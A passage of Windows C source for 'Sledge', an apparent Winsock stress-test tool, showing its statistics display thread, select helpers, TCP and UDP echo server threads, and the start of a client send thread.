                        g_ccClientConns[iConn].InClose = FALSE;
					
                    g_ccClientConns[iConn].InClose = FALSE;
                }
                break;
            }
        }
		LeaveCriticalSection(&g_csSledgeCritSection);
    }
    return(0);
}

//***********************************************************************************
//*** DisplayThread - Thread that displays status information about test progress ***
//***********************************************************************************
DWORD WINAPI DisplayThread(LPVOID *pParm)
{
    int   iConn;
    
    ULONG DeltaTime;
	ULONG TotalPackets;
	ULONG TotalBytes;
	ULONG TotalBytesPerSec;
	
    TCHAR *pStr;
	
	DWORD ElapsedTime, ElapsedSeconds, ElapsedMinutes, ElapsedHours;
    DWORD StartTime = g_dwLastTime = GetTickCount();
	
    while(1)
    {
		
		if(g_fVerbose)
		{
			Sleep(10000);
			
			DeltaTime = GetTickCount() - g_dwLastTime;
			g_dwLastTime += DeltaTime;
			DeltaTime = DeltaTime / 1000;
			
			if (g_bFinished == TRUE)
			{
				return (0);
			}
			
			ElapsedTime = g_dwLastTime - StartTime;
			ElapsedSeconds = (ElapsedTime / 1000) % 60;
			ElapsedMinutes = (ElapsedTime / 60000) % 60;
			ElapsedHours = ElapsedTime / 3600000;
			TRACE(TEXT("Running for %dh:%02dm:%02ds\r\n"), ElapsedHours, ElapsedMinutes, ElapsedSeconds);
			
			if (g_iServConns > 0)
			{
				TotalPackets = TotalBytes = TotalBytesPerSec = 0;
				
				TRACE(TEXT(" Server            Packet Size\r\n"));
				TRACE(TEXT("Connection        Min  Max  Avg   Packets      Bytes    Bytes/s\r\n"));
				TRACE(TEXT("----------       ---- ---- ---- ----------- ----------- -------\r\n"));
				
				for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
				{
					if (g_scServConns[iConn].ConnType != CONN_IDLE)
					{
						if (g_scServConns[iConn].SleepyRecv)
							pStr = TEXT("zzzz");
						else
							pStr = TEXT("loop");
						
						g_scServConns[iConn].SleepyRecv = FALSE;
					
						TRACE(TEXT("%3d %6s       %4d %4d %4d %11d %11d %7d (%s) %c%c%c\r\n"),
							g_scServConns[iConn].Index,
							CONN_TYPES_Str[g_scServConns[iConn].ConnType],
							g_scServConns[iConn].PacketLenMin,
							g_scServConns[iConn].PacketLenMax,
							(g_scServConns[iConn].TotalPacketsLoop > 0) ?
							g_scServConns[iConn].TotalBytesLoop / 
							g_scServConns[iConn].TotalPacketsLoop :
						0,
							g_scServConns[iConn].TotalPacketsLoop,
							g_scServConns[iConn].TotalBytesLoop,
							(g_scServConns[iConn].DeltaBytesLoop + DeltaTime -1)
							/ DeltaTime,
							pStr,
							(g_scServConns[iConn].InSend)  ? TEXT('S') : TEXT(' '),
							(g_scServConns[iConn].InRecv)  ? TEXT('R') : TEXT(' '),
							(g_scServConns[iConn].InClose) ? TEXT('C') : TEXT(' '));
						
						TotalPackets += g_scServConns[iConn].TotalPacketsLoop;
						TotalBytes += g_scServConns[iConn].TotalBytesLoop;
						TotalBytesPerSec += (g_scServConns[iConn].DeltaBytesLoop +
							DeltaTime -1)
							/ DeltaTime;
						g_scServConns[iConn].DeltaBytesLoop = 0;
					}        
				}
				
				TRACE(TEXT("Totals                          %11d ")
					TEXT("%11d %7d (loop)\r\n"),
					TotalPackets, TotalBytes, TotalBytesPerSec);
			}
			
			if (g_iClientConns > 0)
			{
				TotalPackets = TotalBytes = TotalBytesPerSec = 0;
				TRACE(TEXT(" Client            Packet Size\r\n"));
				TRACE(TEXT("Connection Cycle  Min  Max  Avg   Packets      Bytes    Bytes/s\r\n"));
				TRACE(TEXT("---------- ----- ---- ---- ---- ----------- ----------- -------\r\n"));
				
				for (iConn = 0; iConn < g_iClientConns; iConn++)
				{
					if (g_ccClientConns[iConn].ConnType != CONN_IDLE)
					{
						if (g_ccClientConns[iConn].SleepyRecv)
							pStr = TEXT("zzzz");
						else
							pStr = TEXT("recv");
						
						g_ccClientConns[iConn].SleepyRecv = FALSE;
						
						TRACE(TEXT("%3d %6s %5d %4d %4d %4d %11d %11d %7d (send) %c%c%c\r\n")
							TEXT("                                          %11d %11d %7d (%s)\r\n"),
							g_ccClientConns[iConn].Index,
							CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
							g_ccClientConns[iConn].Cycle,
							g_ccClientConns[iConn].PacketLenMin,
							g_ccClientConns[iConn].PacketLenMax,
							(g_ccClientConns[iConn].TotalPacketsOut > 0) ?
							g_ccClientConns[iConn].TotalBytesOut / 
							g_ccClientConns[iConn].TotalPacketsOut :
						0,
							g_ccClientConns[iConn].TotalPacketsOut,
							g_ccClientConns[iConn].TotalBytesOut,
							(g_ccClientConns[iConn].DeltaBytesOut+DeltaTime-1) /
							DeltaTime,
							(g_ccClientConns[iConn].InSend)  ? TEXT('S') : TEXT(' '),
							(g_ccClientConns[iConn].InRecv)  ? TEXT('R') : TEXT(' '),
							(g_ccClientConns[iConn].InClose) ? TEXT('C') : TEXT(' '),
							g_ccClientConns[iConn].TotalPacketsIn,
							g_ccClientConns[iConn].TotalBytesIn,
							(g_ccClientConns[iConn].DeltaBytesIn+DeltaTime-1) /
							DeltaTime,
							pStr);
						
						TotalPackets += g_ccClientConns[iConn].TotalPacketsOut;
						TotalPackets += g_ccClientConns[iConn].TotalPacketsIn;
						TotalBytes += g_ccClientConns[iConn].TotalBytesOut;
						TotalBytes += g_ccClientConns[iConn].TotalBytesIn;
						TotalBytesPerSec += (g_ccClientConns[iConn].DeltaBytesOut +
							DeltaTime -1) / DeltaTime;
						TotalBytesPerSec += (g_ccClientConns[iConn].DeltaBytesIn +
							DeltaTime -1) / DeltaTime;
						
						g_ccClientConns[iConn].DeltaBytesOut = 0;
						
						g_ccClientConns[iConn].DeltaBytesIn = 0;
					}        
				}
				
				TRACE(TEXT("Totals                          %11d %11d ")
					TEXT("%7d (client)\r\n"),
					TotalPackets, TotalBytes, TotalBytesPerSec);
				TRACE(TEXT("Lost Packets     Late Packets     Bad Packets \r\n")
					TEXT("          ------------     ------------     ------------\r\n")
					TEXT("          %12d     %12d     %12d\r\n"),
					g_ccClientConns[iConn].TotalLostPackets,
					g_ccClientConns[iConn].TotalLatePackets,
					g_ccClientConns[iConn].TotalBadPackets);
			}
			
		}
		else //if(!g_fVerbose)
		{
			Sleep(30000);
			
			TRACE(TEXT("Received %d packets, containing %d bytes total\r\n"),
				g_dwTotalPacketsIn, g_dwTotalBytesIn);
		}
		
		
    }
	
    return(0);
}
//**************************************************************************************
//*** WaitForWriteableSocket - Call select on the socket to see when it is writeable ***
//**************************************************************************************
BOOL WaitForWriteableSocket(SOCKET sockServ)
{
	FD_SET	writefds;
	INT		iRet;

	if(sockServ == INVALID_SOCKET)
		return FALSE;

	// Clear all the FD_SET structures
	FD_ZERO(&writefds);
	FD_SET(sockServ, &writefds);

//	TRACE(TEXT("Calling select... Looking for writeability\r\n"));

	// Do a blocking select
	if((iRet = select( 0, NULL, &writefds, NULL, NULL)) == SOCKET_ERROR)
	{
        TRACE(TEXT("Sledge[]: select() error %s\r\n"), GetLastErrorText());
        return FALSE;
	}

	// If select returned but didn't fill any of the FD_SET structures, something is wrong
	if(!iRet)
	{
        TRACE(TEXT("Sledge[]: select() didn't return any sockets\r\n"));
        return FALSE;
	}
	
	// If the socket isn't ready for writing, then something else must have happened... This is a failure.
	if(!FD_ISSET(sockServ, &writefds))
	{
        TRACE(TEXT("Sledge[]: writing socket failed\r\n"));
        return FALSE;
	}

//	TRACE(TEXT("Socket is writeable!\r\n"));

	// There is pending data or a pending connection
	return TRUE;
}

//************************************************************************************
//*** WaitForReadableSocket - Call select on the socket to see when it is readable ***
//************************************************************************************
BOOL WaitForReadableSocket(SOCKET sockServ)
{
	FD_SET	readfds;
	INT		iRet;

	if(sockServ == INVALID_SOCKET)
		return FALSE;

	// Clear all the FD_SET structures
	FD_ZERO(&readfds);
	FD_SET(sockServ, &readfds);

//	TRACE(TEXT("Calling select... Looking for readability\r\n"));

	// Do a blocking select
	if((iRet = select( 0, &readfds, NULL, NULL, NULL)) == SOCKET_ERROR)
	{
        TRACE(TEXT("Sledge[]: select() error %s\r\n"), GetLastErrorText());
        return FALSE;
	}

	// If select returned but didn't fill any of the FD_SET structures, something is wrong
	if(!iRet)
	{
        TRACE(TEXT("Sledge[]: select() didn't return any sockets\r\n"));
        return FALSE;
	}
	
	// If the socket isn't ready for reading, then something else must have happened... This is a failure.
	if(!FD_ISSET(sockServ, &readfds))
	{
        TRACE(TEXT("Sledge[]: reading socket failed\r\n"));
        return FALSE;
	}

//	TRACE(TEXT("Socket is readable!\r\n"));

	// There is pending data or a pending connection
	return TRUE;
}

//**************************************************************************************
//*** TCPServThread - Thread that handles incoming connections from TCP client tests ***
//**************************************************************************************
DWORD WINAPI TCPServThread(LPVOID *pParm)
{
    SOCKADDR_IN ServSockAddr = { AF_INET };
    SOCKADDR_IN PeerSockAddr;
    int         sizeofSockAddr;
	
    SOCKET      ServSock;
    SOCKET      NewSock;
	
    HANDLE      hThread;
    DWORD       dwThreadId;
	ULONG		uNonBlockParam = TRUE;
	
    int         iConn;
	
	// Set the local socket parameters
    memset(&ServSockAddr, 0, sizeof(struct sockaddr));
    ServSockAddr.sin_port        = htons(TCP_SERV_PORT);
    ServSockAddr.sin_addr.s_addr = INADDR_ANY;
    ServSockAddr.sin_family = AF_INET;
	
	// Create the socket
    if ((ServSock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        TRACE(TEXT("Sledge[%s]: socket() failed %s\r\n"), CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        ExitProcess(0);
    }

	// If necessary, set the socket for non-blocking IO
	if(g_fNonBlocking)
	{
//		TRACE(TEXT("Setting server socket for non-blocking IO\r\n"));
		if(ioctlsocket(ServSock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
		{
			TRACE(TEXT("Sledge[%s]: ioctlsocket() error %s while setting to non-blocking\r\n"),
				CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
			ExitProcess(0);
		}
	}
    
	// Bind the socket to the local address
    if (bind(ServSock, (const struct sockaddr *) &ServSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        TRACE(TEXT("Sledge[%s]: bind() error %s\r\n"), CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        ExitProcess(0);
    }
	
	// Set the socket for accepting incoming connections
    if (listen(ServSock, SERV_BACKLOG) == SOCKET_ERROR)
    {
        TRACE(TEXT("Sledge[%s]: listen() error %s\r\n"), CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        ExitProcess(0);
    }
	
    while(1)
    {
		// Initialize the incoming address information
        sizeofSockAddr = sizeof(SOCKADDR_IN);
        memset(&PeerSockAddr, 0, sizeof (struct sockaddr));
        PeerSockAddr.sin_family = AF_INET;

		// Accept the pending connection
        if ((NewSock = accept(ServSock, (struct sockaddr *) &PeerSockAddr, &sizeofSockAddr)) == INVALID_SOCKET)
        {
			if(g_fNonBlocking)
			{
				// If we are using a non-blocking socket and the socket would have blocked, wait for incoming connections
				if(WSAGetLastError() == WSAEWOULDBLOCK)
				{
//					TRACE(TEXT("Server thread would have blocked.  Wait for incoming connection\r\n"));
					if(!WaitForReadableSocket(ServSock))
						ExitProcess(0);

//					TRACE(TEXT("Select indicated that there is a pending connection.  Calling accept\r\n"));
					if ((NewSock = accept(ServSock, (struct sockaddr *) &PeerSockAddr, &sizeofSockAddr)) == INVALID_SOCKET)
					{
						TRACE(TEXT("Sledge[%s]: accept() error %s (after select returned success!)\r\n"),
							CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
						ExitProcess(0);
					}

				}
			}
			else
			{
				TRACE(TEXT("Sledge[%s]: accept() error %s\r\n"), CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
				ExitProcess(0);
			}
        }
		
        EnterCriticalSection(&g_csSledgeCritSection);
		
        for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)        
        {
            if (g_scServConns[iConn].ConnType == CONN_IDLE)
                break;
        }
		
        if (g_scServConns[iConn].ConnType != CONN_IDLE)
        {
            TRACE(TEXT("Sledge[%s]: g_scServConns[iConn].ConnType != CONN_IDLE\r\n"));
            ExitProcess(0);
        }
        
        g_iServConns++;
		
        g_scServConns[iConn].ConnType         = CONN_TCP;
        g_scServConns[iConn].Sock             = NewSock;
        g_scServConns[iConn].PacketLenMin     = 9999;
        g_scServConns[iConn].PacketLenMax     = 0;
        g_scServConns[iConn].TotalPacketsLoop = 0;
        g_scServConns[iConn].TotalBytesLoop   = 0;
        g_scServConns[iConn].DeltaBytesLoop   = 0;
        g_scServConns[iConn].SleepyRecv       = FALSE;
        g_scServConns[iConn].InSend           = FALSE;
        g_scServConns[iConn].InRecv           = FALSE;
        g_scServConns[iConn].InClose          = FALSE;
		
        LeaveCriticalSection(&g_csSledgeCritSection);
        
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ServRecvThread, &g_scServConns[iConn], 0, &dwThreadId)) == NULL)
        {
            TRACE(TEXT("Sledge[%d,%s]: CreateThread(ServRecvThread) failed %d\r\n"),
				iConn, 
				CONN_TYPES_Str[g_scServConns[iConn].ConnType],
				GetLastError());
			
            ExitProcess(0);
        }
		
        CloseHandle(hThread);
    }        
	
    return(0);
}

//**************************************************************************************
//*** UDPServThread - Thread that handles incoming connections from UDP client tests ***
//**************************************************************************************
DWORD WINAPI UDPServThread(LPVOID *pParm)
{
    SOCKADDR_IN ServSockAddr = { AF_INET };
	
    SOCKET      ServSock;
	
    HANDLE      hThread;
    DWORD       dwThreadId;
	ULONG		uNonBlockParam = TRUE;
	
    int         iConn;
	
	// Set the local socket parameters
    memset(&ServSockAddr, 0, sizeof(struct sockaddr));
    ServSockAddr.sin_port        = htons(UDP_SERV_PORT);
    ServSockAddr.sin_addr.s_addr = INADDR_ANY;
    ServSockAddr.sin_family = AF_INET;
	
	// Create the socket
    if ((ServSock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
    {
        TRACE(TEXT("Sledge[%s]: socket() failed %s\r\n"), CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
        ExitProcess(0);
    }
	
	// If necessary, set the socket for non-blocking IO
	if(g_fNonBlocking)
	{
//		TRACE(TEXT("Setting server socket for non-blocking IO\r\n"));

		if(ioctlsocket(ServSock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
		{
			TRACE(TEXT("Sledge[%s]: ioctlsocket() error %s while setting to non-blocking\r\n"),
				CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
			ExitProcess(0);
		}
	}

	// Bind the socket to the local address
    if (bind(ServSock, (const struct sockaddr *) &ServSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        TRACE(TEXT("Sledge[%s]: bind() error %s\r\n"), CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
        ExitProcess(0);
    }
	
	EnterCriticalSection(&g_csSledgeCritSection);
	
	for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)        
	{
		if (g_scServConns[iConn].ConnType == CONN_IDLE)
			break;
	}
	
	if (g_scServConns[iConn].ConnType != CONN_IDLE)
	{
		TRACE(TEXT("Sledge[%s]: g_scServConns[iConn].ConnType != CONN_IDLE\r\n"));
		ExitProcess(0);
	}
	
	g_iServConns++;
	
	g_scServConns[iConn].ConnType         = CONN_UDP;
	g_scServConns[iConn].Sock             = ServSock;
	g_scServConns[iConn].PacketLenMin     = 9999;
	g_scServConns[iConn].PacketLenMax     = 0;
	g_scServConns[iConn].TotalPacketsLoop = 0;
	g_scServConns[iConn].TotalBytesLoop   = 0;
	g_scServConns[iConn].DeltaBytesLoop   = 0;
	g_scServConns[iConn].SleepyRecv       = FALSE;
	g_scServConns[iConn].InSend           = FALSE;
	g_scServConns[iConn].InRecv           = FALSE;
	g_scServConns[iConn].InClose          = FALSE;
	
	LeaveCriticalSection(&g_csSledgeCritSection);
	
	if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ServRecvThread, &g_scServConns[iConn], 0, &dwThreadId)) == NULL)
	{
		TRACE(TEXT("Sledge[%d,%s]: CreateThread(ServRecvThread) failed %d\r\n"),
			iConn, CONN_TYPES_Str[g_scServConns[iConn].ConnType],
			GetLastError());
		
		ExitProcess(0);
	}
	
	CloseHandle(hThread);
	
    return(0);
}

//********************************************************************************************
//*** ServRecvThread - Thread that handles receiving and echoing data back to client tests ***
//********************************************************************************************
DWORD WINAPI ServRecvThread(LPVOID *pParm)
{
    SERV_CONNS *pConn = (SERV_CONNS *) pParm;
	
	char *Packet;
    ULONG  BytesRead, BytesSent;
	ULONG  TotalBytesSent;
	int PeerLen = sizeof(SOCKADDR_IN);
	
    BOOL ExpectedErrorExit = FALSE;
    BOOL EOFRcvd = FALSE;
	SOCKADDR_IN   PeerSockAddr;
	
	// Allocate and initialize the packet buffer
	Packet = (char *) LocalAlloc(LPTR, PACKET_MAX_LEN);
	memset(&PeerSockAddr, 0, sizeof(SOCKADDR_IN));
	if (NULL == Packet)
	{
		TRACE(TEXT("Sledge[%d,%s]: unable to allocate packet\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		
        ExitProcess(0);
    }
    
	while(1)
	{
        switch(pConn->ConnType)
        {
		case CONN_TCP:
			// Randomly determine if we should do a sleepy receive
            if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ServSleepyRecvs)
            {
                pConn->SleepyRecv = TRUE;
                Sleep(SLEEP_BEFORE_RECV_MS);
            }
			
            pConn->InRecv = TRUE;
			
            if ((BytesRead = recv(pConn->Sock, (char *) Packet,	g_SledgeParms.ServRecvLen, 0)) == SOCKET_ERROR)
            {
				//If this is a non-blocking socket and the recv completes asynchornously, then this isn't an error
				if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
//					TRACE(TEXT("Server thread would have blocked.  Wait for incoming data\r\n"));

					if(WaitForReadableSocket(pConn->Sock))
					{	

//						TRACE(TEXT("Select indicated that there is pending data.  Calling recv\r\n"));
						if((BytesRead = recv(pConn->Sock,(char *) Packet,g_SledgeParms.ServRecvLen,0)) != SOCKET_ERROR)
						{
							goto TCPReadOK;
						}
					}
				}
				
                pConn->InRecv = FALSE;
				
				// If we are using in flight closes
                if (g_SledgeParms.InFlightCloses)
                {
					// If this wasn't caused by the HatchetThread, then exit
                    if (GetLastError() != WSAECONNRESET && GetLastError() != WSAECONNABORTED && GetLastError() != WSAEINVAL)
                    {
                        TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
							pConn->Index, 
							CONN_TYPES_Str[pConn->ConnType], 
							GetLastErrorText());
						
                        ExitProcess(0);
                    }
					// If this was caused by the HatchetThread, handle it the error gracefully
                    else
                    {   
                        TRACE(TEXT("Sledge[%d,%s]: ServRecvThread exiting on expected error %s\r\n"),
							pConn->Index, 
							CONN_TYPES_Str[pConn->ConnType], 
							GetLastErrorText());
						
                        ExpectedErrorExit = TRUE;
                        goto ExitServRecvThread;
                    }
                }
                else
                {
                    TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
						pConn->Index, 
						CONN_TYPES_Str[pConn->ConnType], 
						GetLastErrorText());
					
                    ExitProcess(0);
                }
            }
			
			// The recv succeeded
TCPReadOK:
            pConn->InRecv = FALSE;
			
            if (BytesRead == 0)
            {   
                ExpectedErrorExit = FALSE;
                TRACE(TEXT("Sledge[%d,%s]: ServRecvThread recv returned 0 bytes\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                goto ExitServRecvThread;
            }
			
            if (Packet[BytesRead - 1] == 0x1A)
            {
                EOFRcvd = TRUE;
                BytesRead--;
            }
			
			TotalBytesSent = 0;
			while(TotalBytesSent < BytesRead)
			{
				BytesSent = 0;
				pConn->InSend = TRUE;

				if ((BytesSent = send(pConn->Sock, (char *) Packet + TotalBytesSent, BytesRead - TotalBytesSent, 0)) == SOCKET_ERROR)
				{
					if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
					{
//						TRACE(TEXT("Server thread would have blocked.  Wait for buffer to empty.\r\n"));

						Sleep(100);
						continue;
					}
					
					pConn->InSend = FALSE;
					
					// If we are using in flight closes
					if (g_SledgeParms.InFlightCloses)
					{
						// If this wasn't caused by the HatchetThread, then exit
						if (GetLastError() != WSAECONNRESET &&
							GetLastError() != WSAEDISCON &&
							GetLastError() != WSAECONNABORTED &&
							GetLastError() != WSAEINVAL)
						{
							TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"), 
								pConn->Index, 
								CONN_TYPES_Str[pConn->ConnType], 
								GetLastErrorText());
							
							ExitProcess(0);
						}
						// If this was caused by the HatchetThread, handle it the error gracefully
						else
						{   
							TRACE(TEXT("Sledge[%d,%s]: ServRecvThread exiting on expected error %s\r\n"),
								pConn->Index, 
								CONN_TYPES_Str[pConn->ConnType], 
								GetLastErrorText());
							
							ExpectedErrorExit = TRUE;
							goto ExitServRecvThread;
						}
					}
					else
					{
						TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
							pConn->Index, 
							CONN_TYPES_Str[pConn->ConnType], 
							GetLastErrorText());
						
						ExitProcess(0);
					}
				}
				
				pConn->InSend = FALSE;
				TotalBytesSent += BytesSent;
			}

            if (TotalBytesSent != BytesRead)
            {
                TRACE(TEXT("Sledge[%d,%s]: TotalBytesSent != BytesRead\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                ExitProcess(0);
            }
			
			
            if (EOFRcvd)
            {   
//                TRACE(TEXT("Sledge[%d,%s]: EOFRcvd\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                ExpectedErrorExit = FALSE;
                goto ExitServRecvThread;
            }
            
            EnterCriticalSection(&g_csSledgeCritSection);
			
            pConn->PacketLenMin = MIN(pConn->PacketLenMin, (int) BytesRead);
            pConn->PacketLenMax = MAX(pConn->PacketLenMax, (int) BytesRead);
			
            pConn->TotalPacketsLoop++;
            pConn->TotalBytesLoop += BytesRead;
            pConn->DeltaBytesLoop += BytesRead;
			
            LeaveCriticalSection(&g_csSledgeCritSection);
            break;
			
			//Added UDP support... - TBJ 7/29/98
          case CONN_UDP:
			  if (RandomRange(0, 99) < SERV_PERCENT_SLEEPY_RECVS)
			  {
				  pConn->SleepyRecv = TRUE;
				  
				  Sleep(SLEEP_BEFORE_RECV_MS);
			  }
			  
			  pConn->InRecv = TRUE;
			  
			  //Since we are dealing with datagrams that can be of any size, we
			  //ignore the server receive length since this might cause us to
			  //cut datagrams into pieces and lose data... instead we set the
			  //receive length to the maximum value... we also capture the address
			  //of the socket which sent this data
			  if ((BytesRead =
				  recvfrom(pConn->Sock, Packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &PeerSockAddr, &PeerLen))
				  == SOCKET_ERROR)
			  {
				  //If this is a non-blocking socket and the recvfrom completes asynchronously, then this isn't an error
				  if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				  {
//					  TRACE(TEXT("Server thread would have blocked.  Wait for incoming data\r\n"));

					  if(WaitForReadableSocket(pConn->Sock))
					  {	
//						  TRACE(TEXT("Select indicated that there is pending data.  Calling recvfrom\r\n"));

						  if((BytesRead =
							  recvfrom(pConn->Sock, Packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &PeerSockAddr, &PeerLen))
							  != SOCKET_ERROR)
						  {
							  goto UDPReadOK;
						  }
					  }
				  }
				  
				  pConn->InRecv = FALSE;
				  
				  if (g_SledgeParms.InFlightCloses)
				  {
					  if (GetLastError() != WSAECONNRESET &&
						  GetLastError() != WSAECONNABORTED &&
						  GetLastError() != WSAEINVAL)
					  {
						  TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
							  pConn->Index,
							  CONN_TYPES_Str[pConn->ConnType],
							  GetLastErrorText());
						  
						  ExitProcess(0);
					  }
					  else
					  {   
						  ExpectedErrorExit = TRUE;
						  goto ExitServRecvThread;
					  }
				  }
				  else
				  {
					  TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
						  pConn->Index,
						  CONN_TYPES_Str[pConn->ConnType], 
						  GetLastErrorText());
					  
					  ExitProcess(0);
				  }
			  }
			  
			  // The recvfrom succeeded
UDPReadOK:
			  pConn->InRecv = FALSE;
			  
			  if (BytesRead == 0)
			  {   
				  ExpectedErrorExit = FALSE;
				  goto ExitServRecvThread;
			  }
			  
			  if (Packet[BytesRead - 1] == 0x1A)
			  {
				  EOFRcvd = TRUE;
				  BytesRead--;
			  }
			  
			  // DumpMem(Packet, BytesRead);
			  
			  pConn->InSend = TRUE;
			  
			  if ((BytesSent = sendto(pConn->Sock, Packet, BytesRead, 0,
				  (const struct sockaddr *) &PeerSockAddr, PeerLen)) 
				  == SOCKET_ERROR)
			  {
				  
			  		//Wait for 100ms between sendto attempts...
				  while(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				  {
//					  TRACE(TEXT("Server thread would have blocked.  Wait for buffer to empty\r\n"));

					  if ((BytesSent =
						  sendto(pConn->Sock,Packet,BytesRead,0,(const struct sockaddr *)&PeerSockAddr,PeerLen))
						  != SOCKET_ERROR)
					  {
						  if(BytesSent < BytesRead)
						  {
							  TRACE(TEXT("Sledge[%d,%s]: sendto() sent a UDP fragment!\r\n"),
								  pConn->Index, 
								  CONN_TYPES_Str[pConn->ConnType]);
							  
							  ExitProcess(0);
						  }

						  goto UDPWriteOK;
					  }
					  
					  Sleep(100);
				  }
				  
				  pConn->InSend = FALSE;
				  
				  if (g_SledgeParms.InFlightCloses)
				  {
					  if (GetLastError() != WSAECONNRESET &&
						  GetLastError() != WSAEDISCON &&
						  GetLastError() != WSAECONNABORTED &&
						  GetLastError() != WSAEINVAL)
					  {
						  TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
							  pConn->Index, 
							  CONN_TYPES_Str[pConn->ConnType], 
							  GetLastErrorText());
						  
						  ExitProcess(0);
					  }
					  else
					  {   
						  ExpectedErrorExit = TRUE;
						  goto ExitServRecvThread;
					  }
				  }
				  else
				  {
					  TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
						  pConn->Index,
						  CONN_TYPES_Str[pConn->ConnType], 
						  GetLastErrorText());
					  
					  ExitProcess(0);
				  }
			  }

// The sendto succeeded
UDPWriteOK:

			  pConn->InSend = FALSE;
			  
			  if (BytesSent != BytesRead)
			  {
				  TRACE(TEXT("Sledge[%d,%s]: BytesSent != BytesRead\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
				  ExitProcess(0);
			  }
			  
			  
			  if (EOFRcvd)
			  {   
//				  TRACE(TEXT("Sledge[%d,%s]: EOFRcvd\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
				  ExpectedErrorExit = FALSE;
				  goto ExitServRecvThread;
			  }
			  
			  EnterCriticalSection(&g_csSledgeCritSection);
			  
			  pConn->PacketLenMin = (int) MIN((ULONG) pConn->PacketLenMin, BytesRead);
			  pConn->PacketLenMax = (int) MAX((ULONG) pConn->PacketLenMax, BytesRead);
			  
			  if((pConn->TotalBytesLoop + BytesRead) >= ROLLOVER_LIMIT)
			  {
				  pConn->TotalPacketsLoop = 1;
				  pConn->TotalBytesLoop = BytesRead;
				  pConn->DeltaBytesLoop = BytesRead;
			  }
			  else
			  {
				  pConn->TotalPacketsLoop++;
				  pConn->TotalBytesLoop += BytesRead;
				  pConn->DeltaBytesLoop += BytesRead;
			  }
			  
			  LeaveCriticalSection(&g_csSledgeCritSection);
			  break;
        }
    }
	
ExitServRecvThread:
	
    pConn->InClose = TRUE;
    
    if (closesocket(pConn->Sock) == SOCKET_ERROR)
    {
        pConn->InClose = FALSE;
        
        TRACE(TEXT("Sledge[%d,%s]: closesocket() error %s\r\n"),
			pConn->Index, 
			CONN_TYPES_Str[pConn->ConnType],
			GetLastErrorText());
		
        ExitProcess(0);
		
    }
	
    pConn->InClose = FALSE;
	
    EnterCriticalSection(&g_csSledgeCritSection);
	
    g_iServConns--;
	
    pConn->ConnType = CONN_IDLE;
	
    LeaveCriticalSection(&g_csSledgeCritSection);
	
	LocalFree (Packet);
	
    return(0);
}

//*************************************************************************
//*** ClientSendThread - Thread that handles sending data to the server ***
//*************************************************************************
DWORD WINAPI ClientSendThread(LPVOID *pParm)
{
    CLIENT_CONNS *pConn = (CLIENT_CONNS *) pParm;
    BOOL  SocketClosed  =  FALSE;
    BYTE *Packet;
	
    int   Reps, Len; 
	
	Packet = (BYTE *) LocalAlloc(LPTR, PACKET_MAX_LEN);
	
	if (NULL == Packet)
	{
		TRACE(TEXT("Sledge[%d,%s]: unable to allocate packet\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		
        ExitProcess(0);
    }
	
	for	(Reps = 0; Reps < g_SledgeParms.PacketsPerConn && ! SocketClosed; Reps++)
	{
		EnterCriticalSection(&g_csSledgeCritSection);
		
		if(pConn->ConnType != CONN_UDP)
			Len = RandomRange(g_SledgeParms.TCPMinPacketLen, g_SledgeParms.TCPMaxPacketLen);
		else
			Len = RandomRange(g_SledgeParms.UDPMinPacketLen, g_SledgeParms.UDPMaxPacketLen);
		
        pConn->PacketsOut[pConn->PacketsOutHead].Len = Len;
        
		pConn->PacketsOut[pConn->PacketsOutHead].CheckSum = 
			BuildTestPacket(pConn, Len, Packet, Reps);
		
		pConn->PacketsOut[pConn->PacketsOutHead].Index = Reps;
		
		LeaveCriticalSection(&g_csSledgeCritSection);
		
        switch(pConn->ConnType)
        {
		case CONN_TCP:
            if (SendPacketSTREAM(pConn, Len, Packet) != 0)
                SocketClosed = TRUE;
			break;
		case CONN_UDP:
            if (SendPacketDGRAM(pConn, Len, Packet) != 0)
                SocketClosed = TRUE;
            break;
		default:
			TRACE(TEXT("Sledge[%d,%s]: invalid connection type\r\n"),
